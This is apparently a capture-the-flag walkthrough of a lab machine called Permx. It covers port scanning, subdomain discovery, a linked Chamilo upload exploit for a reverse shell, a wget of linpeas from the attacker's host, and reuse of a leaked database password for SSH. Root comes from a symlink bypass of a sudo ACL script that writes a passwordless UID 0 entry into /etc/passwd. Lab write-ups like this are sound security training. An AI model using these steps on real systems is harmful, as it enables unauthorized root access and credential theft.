---
title: "Permx"
date: 2024-09-30
slug: "permx"
tags: ["machines", "permx", "walkthrough"]
cover: "/images/permx/Pasted image 20240930162129.png"
summary: "Walkthrough of the Permx Machines machine covering recon, exploitation, and privilege escalation."
---
## 1: Nmap

```shell
nmap 10.10.11.23                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 15:33 EEST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 97.75% done; ETC: 15:33 (0:00:01 remaining)
Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 15:34 (0:00:00 remaining)
Nmap scan report for 10.10.11.23
Host is up (1.3s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 104.36 seconds

```

```shell
sudo nmap -sV -sC -p 22,80 10.10.11.23                                      
[sudo] password for hussein: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 15:41 EEST
Nmap scan report for 10.10.11.23
Host is up (1.7s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.24 seconds

```

## 2: Subdomain Enumeration

```shell
gobuster dns -d permx.htb -w /usr/share/wordlists/amass/jhaddix_all.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     permx.htb
[+] Threads:    100
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/amass/jhaddix_all.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: lms.permx.htb

```


add it to /etc/hosts
![permx-1](/images/permx/Pasted image 20240930162129.png)

found a proof of concept of an RCE vulnerability in Chamilo plugin

## 3: Getting a Shell

The PoC: https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc/tree/main

Obtained a reverse shell
![permx-2](/images/permx/Pasted image 20240930163435.png)

## 4: Obtain User flag

```shell
www-data@permx:/var/www/chamilo$ wget http://10.10.16.75/linpeas.sh -o linpeas.sh
<o$ wget http://10.10.16.75/linpeas.sh -o linpeas.sh
www-data@permx:/var/www/chamilo$ ls
ls
CODE_OF_CONDUCT.md
CONTRIBUTING.md
LICENSE
README.md
app
apple-touch-icon.png
bin
bower.json
certificates
cli-config.php
codesize.xml
composer.json
composer.lock
custompages
documentation
favicon.ico
favicon.png
index.php
license.txt
linpeas.sh
linpeas.sh.1
main
news_list.php
plugin
robots.txt
src
terms.php
user.php
user_portal.php
vendor
web
web.config
whoisonline.php
whoisonlinesession.php
www-data@permx:/var/www/chamilo$ chmod +x linpeas.sh
chmod +x linpeas.sh

```

useful things from linpeas:

```shell
/var/www/chamilo/app/config/configuration.php:                'show_password_field' => false,
/var/www/chamilo/app/config/configuration.php:                'show_password_field' => true,
/var/www/chamilo/app/config/configuration.php:        'wget_password' => '',
/var/www/chamilo/app/config/configuration.php:    'force_different_password' => false,
/var/www/chamilo/app/config/configuration.php:$_configuration['auth_password_links'] = [
/var/www/chamilo/app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
/var/www/chamilo/app/config/configuration.php:$_configuration['password_encryption'] = 'bcrypt';
/var/www/chamilo/app/config/configuration.php:/*$_configuration['password_requirements'] = [
/var/www/chamilo/app/config/configuration.php://$_configuration['email_template_subscription_to_session_confirmation_lost_password'] = false;
/var/www/chamilo/app/config/configuration.php://$_configuration['force_renew_password_at_first_login'] = true;
/var/www/chamilo/app/config/configuration.php://$_configuration['password_conversion'] = false;
/var/www/chamilo/cli-config.php:    'password' => $_configuration['db_password'],
/var/www/chamilo/main/admin/db.php:';if($Qd=="auth"){$Ce="";foreach((array)$_SESSION["pwds"]as$mh=>$Mf){foreach($Mf
/var/www/chamilo/main/admin/db.php:<tr><th>Password<td><input name="pass" id="pass" value="',h($L["pass"]),'" autocomplete="new-password">
/var/www/chamilo/main/install/configuration.dist.php:                'show_password_field' => false,
/var/www/chamilo/main/install/configuration.dist.php:                'show_password_field' => true,
/var/www/chamilo/main/install/configuration.dist.php:        'wget_password' => '',
/var/www/chamilo/main/install/configuration.dist.php:    'force_different_password' => false,
/var/www/chamilo/main/install/configuration.dist.php:$_configuration['auth_password_links'] = [
/var/www/chamilo/main/install/configuration.dist.php:$_configuration['db_password'] = '{DATABASE_PASSWORD}';
/var/www/chamilo/main/install/configuration.dist.php:$_configuration['password_encryption'] = '{ENCRYPT_PASSWORD}';
/var/www/chamilo/main/install/configuration.dist.php:/*$_configuration['password_requirements'] = [
/var/www/chamilo/main/install/configuration.dist.php://$_configuration['email_template_subscription_to_session_confirmation_lost_password'] = false;
/var/www/chamilo/main/install/configuration.dist.php://$_configuration['force_renew_password_at_first_login'] = true;
/var/www/chamilo/main/install/configuration.dist.php://$_configuration['password_conversion'] = false;
/var/www/chamilo/main/install/update-configuration.inc.php:        } elseif (stripos($line, '$userPasswordCrypted') !== false) {
/var/www/chamilo/plugin/buycourses/database.php:        'password' => '',
/var/www/chamilo/plugin/buycourses/database.php:    $paypalTable->addColumn('password', Types::STRING);

```

we found this password: 03F6lY3uXAP2bkW8

and from /etc/passwd and the /home directory, there is a user named mtz so I will try to ssh with it

```shell
ssh mtz@10.10.11.23       
mtz@10.10.11.23's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Sep 30 02:33:36 PM UTC 2024

  System load:  0.0               Processes:             273
  Usage of /:   61.9% of 7.19GB   Users logged in:       1
  Memory usage: 28%               IPv4 address for eth0: 10.10.11.23
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Sep 30 14:27:50 2024 from 10.10.14.84
mtz@permx:~$ ls
etc  file  user.txt
mtz@permx:~$ cat user.txt
4f9c12db92282d5f07814dfe9e5aa5b0
mtz@permx:~$ 

```

first flag: 4f9c12db92282d5f07814dfe9e5aa5b0

## 5: Obtain Root Flag

check privileges:

```shell
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh

```

the file contents:

```shell
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

```

we have to bypass the path traversal filter, use symlink 

```shell
mtz@permx:~$ ln -s /etc/passwd /home/mtz/sharmoota
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/sharmoota
mtz@permx:~$ ls -la
total 140
drwxr-x---  6 mtz  mtz   4096 Sep 30 16:10 .
drwxr-xr-x  3 root root  4096 Jan 20  2024 ..
lrwxrwxrwx  1 root root     9 Jan 20  2024 .bash_history -> /dev/null
-rw-r--r--  1 mtz  mtz    220 Jan  6  2022 .bash_logout
-rw-r--r--  1 mtz  mtz   3771 Jan  6  2022 .bashrc
drwx------  2 mtz  mtz   4096 May 31 11:14 .cache
drwx------  3 mtz  mtz   4096 Sep 30 10:47 .gnupg
drwxrwxr-x  3 mtz  mtz   4096 Sep 30 09:38 .local
lrwxrwxrwx  1 root root     9 Jan 20  2024 .mysql_history -> /dev/null
-rw-r--r--  1 mtz  mtz    807 Jan  6  2022 .profile
-rw-rw-r--+ 1 mtz  mtz     31 Sep 30 15:37 script.sh
-rw-------  1 mtz  mtz  12288 Sep 30 11:21 .script.sh.swi
-rw-r--r--  1 mtz  mtz  12288 Sep 30 10:28 .script.sh.swj
-rw-r--r--  1 mtz  mtz  12288 Sep 30 12:35 .script.sh.swk
-rw-r--r--  1 mtz  mtz  12288 Sep 30 09:45 .script.sh.swl
-rw-r--r--  1 mtz  mtz  12288 Sep 30 09:40 .script.sh.swm
-rw-r--r--  1 mtz  mtz  12288 Sep 30 12:35 .script.sh.swn
-rw-r--r--  1 mtz  mtz  12288 Sep 30 09:30 .script.sh.swo
lrwxrwxrwx  1 mtz  mtz     11 Sep 30 16:10 sharmoota -> /etc/passwd
drwx------  2 mtz  mtz   4096 Jan 20  2024 .ssh
-rw-------  1 mtz  mtz  12288 Sep 30 12:35 .swp
-rw-r-----  1 root mtz     33 Sep 30 04:01 user.txt
mtz@permx:~$ 

```

add new root user: user123.

```shell
mtz@permx:~$ nano sharmoota
user123::0:0:user:/root:/bin/bash
```
\
```shell
mtz@permx:~$ su user123
root@permx:/home/mtz# cd /root
root@permx:~# ls
backup  reset.sh  root.txt
root@permx:~# cat root.txt
5fbf048de15988d77e887a7681b4e829
```
